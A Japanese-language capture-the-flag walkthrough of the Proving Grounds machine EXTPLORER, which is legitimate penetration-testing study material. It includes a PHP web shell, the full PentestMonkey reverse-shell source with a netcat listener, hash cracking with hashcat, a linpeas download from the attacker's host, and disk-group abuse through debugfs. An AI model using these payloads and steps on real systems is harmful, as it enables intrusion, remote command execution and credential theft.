+++
title = "Proving Grounds Practice - EXTPLORER Writeup"
date = "2026-10-23"
description = "WordPressの陰に隠れたeXtplorerファイルマネージャに弱い認証情報でログインし、PHP Webシェル経由でinitial accessを取得。dora宛てのbcryptハッシュをhashcatでクラックし、diskグループの権限を悪用してdebugfsでrootのproof.txtを読み出す"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[EXTPLORER]", "[eXtplorer]", "[Weak Credentials]", "[Webshell]", "[Hashcat]", "[Disk Group]", "[debugfs]", "[intermediate]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | EXTPLORER (hostname: dora) |
| OS | Linux |
| Community Rating | Intermediate |
| Target IP | 192.168.201.16 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対してデフォルトスクリプトとバージョン検出を実行する。

```bash
nmap -sV -sC 192.168.201.16
```

スキャン結果は以下のとおり。

```text
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

開いているポートはSSH(22)とHTTP(80)の2つのみ。まずはポート80のWebアプリケーションから調査する。

### WPScan

ポート80のトップページにアクセスすると `wp-admin/setup-config.php` にリダイレクトされることから、WordPressがインストールされていることが分かる。WPScanでWordPress自体の情報を収集する。

```bash
wpscan --url http://192.168.201.16/
```

結果の抜粋は以下のとおり。

```text
[+] URL: http://192.168.201.16/ [192.168.201.16]
[+] Effective URL: http://192.168.201.16/wp-admin/setup-config.php

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)

[+] WordPress readme found: http://192.168.201.16/readme.html

[+] WordPress version 6.2 identified (Insecure, released on 2023-03-29).
 |  - http://192.168.201.16/wp-includes/css/dashicons.min.css?ver=6.2

[i] The main theme could not be detected.
```

WordPress 6.2が稼働していることが確認できたが、`setup-config.php` にリダイレクトされる状態（未設定状態）であり、この時点ではWordPress自体に直接的な侵入口は見当たらない。

### GoBuster

ディレクトリ・ファイルのブルートフォースを実施する。

```bash
gobuster dir -u http://192.168.201.16/ -w /usr/share/wordlists/dirb/common.txt
```

結果は以下のとおり。

```text
.hta                 (Status: 403) [Size: 279]
.htaccess            (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
filemanager          (Status: 301) [Size: 322] [--> http://192.168.201.16/filemanager/]
index.php            (Status: 302) [Size: 0] [--> http://192.168.201.16/wp-admin/setup-config.php]
server-status        (Status: 403) [Size: 279]
wordpress            (Status: 301) [Size: 320] [--> http://192.168.201.16/wordpress/]
wp-admin             (Status: 301) [Size: 319] [--> http://192.168.201.16/wp-admin/]
wp-content           (Status: 301) [Size: 321] [--> http://192.168.201.16/wp-content/]
wp-includes          (Status: 301) [Size: 322] [--> http://192.168.201.16/wp-includes/]
xmlrpc.php           (Status: 302) [Size: 0] [--> http://192.168.201.16/wp-admin/setup-config.php]
```

`wp-*` 以外に `/filemanager` という気になるディレクトリが発見できた。

```text
http://192.168.201.16/filemanager/
```

アクセスすると **eXtplorer** というファイルマネージャアプリケーションのログイン画面が表示された。

---

## Exploitation

### eXtplorerへの弱い認証情報でのログイン

eXtplorerのログイン画面に対し、デフォルト/推測可能な認証情報である `admin/admin` を試したところ、ログインに成功した。

```text
http://192.168.201.16/filemanager/
admin / admin でログイン
```

### Webシェルの設置

ログイン後、eXtplorerのファイルアップロード／編集機能を利用し、Webサーバー上（WordPressの `wp-admin` ディレクトリ配下）に `hoge.php` というPHPファイルを作成した。

```php
<?php system($_GET['cmd']); ?>
```

ブラウザから以下のURLにアクセスし、コマンド実行が可能であることを確認する。

```text
http://192.168.201.16/wp-admin/hoge.php?cmd=id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`www-data` 権限でのコマンド実行が可能であることが確認できた。

### リバースシェルの取得

続いて、PentestMonkeyのPHPリバースシェルを用いて対話的なシェルを取得する。接続先（`$ip`、`$port`）を攻撃側の情報に変更し、Webシェル経由でアップロードして実行した。

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

攻撃側でリバースシェルの接続を待ち受ける。

```bash
nc -lvnp 4444
```
```text
listening on [any] 4444 ...
connect to [192.168.45.181] from (UNKNOWN) [192.168.201.16] 46064
[*] Connected to PHP reverse shell
/bin/sh: 0: can't access tty; job control turned off
$ 
```

TTYを取得

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### ユーザー列挙

`/etc/passwd` を確認し、ローカルユーザーを列挙する。ホスト名は `dora` であり、ログイン可能なユーザーとして `dora`（UID 1000, シェル `/bin/sh`）が存在することが分かる。

```bash
www-data@dora:/etc$ cat passwd
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dora:x:1000:1000::/home/dora:/bin/sh
```

### dora のパスワードハッシュ発見

eXtplorer（`filemanager`）の設定ファイルを調査したところ、`.htusers.php` に認証情報（アプリケーションユーザー）のbcryptハッシュが保存されていることを発見した。

```bash
www-data@dora:/var/www/html/filemanager/config$ cat .htusers.php
```

```php
<?php 
        // ensure this file is being included by a parent file
        if( !defined( '_JEXEC' ) && !defined( '_VALID_MOS' ) ) die( 'Restricted access' );
        $GLOBALS["users"]=array(
        array('admin','21232f297a57a5a743894a0e4a801fc3','/var/www/html','http://localhost','1','','7',1),
        array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS','/var/www/html','http://localhost','1','','0',1),
); 
?>
```

`admin` のハッシュはMD5形式（`21232f297a57a5a743894a0e4a801fc3` = `admin`）であり、これはeXtplorerへのログインに使用した値そのものである。一方、`dora` のハッシュは `$2a$08$...` 形式のbcryptハッシュであり、OSログインユーザーである `dora` のパスワードと推測できる。

### ハッシュのクラック

`dora` のハッシュをローカルに保存し、hashcatでハッシュ形式を自動判定する。

```bash
hashcat hash
```

```text
hashcat (v7.1.2) starting in autodetect mode
...
The following 6 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
```

OSのUNIXパスワードハッシュとして一般的な `-m 3200`（bcrypt, Blowfish (Unix)）を指定し、`rockyou.txt` を用いてクラックする。

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

クラック結果を確認する。

```bash
hashcat -m 3200 --show hash
```

```text
$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS:doraemon
```

`dora:doraemon` という認証情報を取得した。

### dora ユーザーへの昇格とlocal.txtの取得

取得した認証情報で `dora` ユーザーに切り替える。

```bash
su dora
```

```text
Password: doraemon
```

```bash
whoami
```

```text
dora
```

TTYを取得し直す。

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

ユーザーフラグ（`local.txt`）を取得する。

```bash
dora@dora:~$ cat local.txt
```

```text
12d056653c405e0ab5ec0fa5b6fb4054
```

---

## Privilege Escalation

### linpeas.sh によるローカル列挙

攻撃側でホストしたWebサーバーから `linpeas.sh` をダウンロードし、実行権限を付与して実行する。

```bash
dora@dora:~$ wget http://192.168.45.181:80/linpeas.sh
```

```text
--2026-10-22 16:38:37--  http://192.168.45.181/linpeas.sh
Connecting to 192.168.45.181:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1169704 (1.1M) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>]   1.12M  1.40MB/s    in 0.8s    

2026-10-22 16:38:38 (1.40 MB/s) - ‘linpeas.sh’ saved [1169704/1169704]
```

```bash
dora@dora:~$ chmod 777 linpeas.sh
dora@dora:~$ ./linpeas.sh
```

実行結果から、現在のユーザー `dora` が所属するグループが確認できる。

```text
═══════════════════════════════╣ Users Information ╠═══════════════════════════════          
                               ╚═══════════════════╝                                         
╔══════════╣ My user (T1033)
╚ https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#users                                                                                
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
```

`dora` ユーザーが **`disk`** グループに所属していることが分かる。`disk` グループはブロックデバイス（ディスク）への直接アクセス権を持つため、実質的にファイルシステム上の全ファイルを読み取り可能な、root権限に準ずる強力な権限となる。参考情報として、HackTricksの該当ページも確認した。

```text
https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#users
```

### disk グループを利用したrootファイルの読み取り

まず、ルートファイルシステムに対応するブロックデバイスを特定する。

```bash
dora@dora:/var/www/html/wp-admin$ df -h
```

```text
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  55% /
udev                               947M     0  947M   0% /dev
tmpfs                              992M     0  992M   0% /dev/shm
tmpfs                              199M  1.2M  198M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              992M     0  992M   0% /sys/fs/cgroup
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
/dev/loop4                          68M   68M     0 100% /snap/lxd/22753
/dev/loop2                          50M   50M     0 100% /snap/snapd/18596
/dev/loop3                          92M   92M     0 100% /snap/lxd/24061
/dev/loop1                          64M   64M     0 100% /snap/core20/1852
/dev/sda2                          1.7G  209M  1.4G  13% /boot
tmpfs                              199M     0  199M   0% /run/user/1000
```

ルート（`/`）は `/dev/mapper/ubuntu--vg-ubuntu--lv` にマウントされていることが分かる。`disk` グループのメンバーはこのブロックデバイスに直接アクセスできるため、`debugfs` を用いてファイルシステムの内容をrootの許可を介さずに読み取ることができる。

```bash
dora@dora:/var/www/html/wp-admin$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
```

```text
debugfs 1.45.5 (07-Jan-2020)
debugfs:  
```

`debugfs` のプロンプト内で `cat` コマンドを使用し、root権限でなければ読み取れないはずの `proof.txt` を取得する。

```text
debugfs:  cat proof.txt
```

```text
02d13717aa11e14a3d0aedb00e18159f
```

これにより、`dora` ユーザーの権限のまま、rootの所有物を含むファイルシステム上の任意のファイルを読み取ることに成功した。

---

## Summary

ポート80で稼働するWordPressの裏に隠れた `/filemanager`（**eXtplorer**）アプリケーションに対し、`admin/admin` という弱い認証情報でログインに成功した。eXtplorerのファイル編集機能を利用して `wp-admin` ディレクトリ配下にPHP Webシェルを設置し、`www-data` 権限でのコマンド実行を確立した。続けてPentestMonkeyのPHPリバースシェルを設置・実行し、対話的なシェルを取得した。

`www-data` でのローカル列挙の過程で、eXtplorerの設定ファイル `.htusers.php` から `dora` ユーザーのbcryptハッシュを発見し、hashcat（`-m 3200`）とrockyou.txtを用いてクラックしたところ、`dora:doraemon` という認証情報が得られた。この認証情報で `su dora` によりOSレベルのユーザーへ昇格し、ユーザーフラグ（`local.txt`）を取得した。

権限昇格フェーズでは、`linpeas.sh` の実行により `dora` ユーザーが **`disk`** グループに所属していることを発見した。`disk` グループのメンバーはルートファイルシステムに対応するブロックデバイス（`/dev/mapper/ubuntu--vg-ubuntu--lv`）へ直接アクセス可能であるため、`debugfs` コマンドを用いてファイルシステムをマウントすることなく直接読み取り、root権限を経由せずにルートフラグ（`proof.txt`）を取得することに成功した。

攻略の流れは以下のとおり。

1. Nmapによるポート・サービスの列挙（22: SSH, 80: Apache + WordPress）
2. WPScanによるWordPressバージョンの確認（6.2、ただし未設定状態）
3. GoBusterによるディレクトリ列挙で `/filemanager`（eXtplorer）を発見
4. 弱い認証情報 `admin/admin` でeXtplorerにログイン
5. eXtplorer経由で `wp-admin` ディレクトリにPHP Webシェル（`hoge.php`）を設置
6. PHPリバースシェルを設置・実行し、`www-data` としての対話シェルを取得
7. `.htusers.php` から `dora` ユーザーのbcryptハッシュを発見
8. hashcatで `dora:doraemon` のクレデンシャルをクラック
9. `su dora` によりOSユーザー `dora` へ昇格、ユーザーフラグ取得
10. `linpeas.sh` の実行で `dora` が `disk` グループに所属していることを発見
11. `debugfs` でブロックデバイスを直接読み取り、rootフラグ（`proof.txt`）を取得


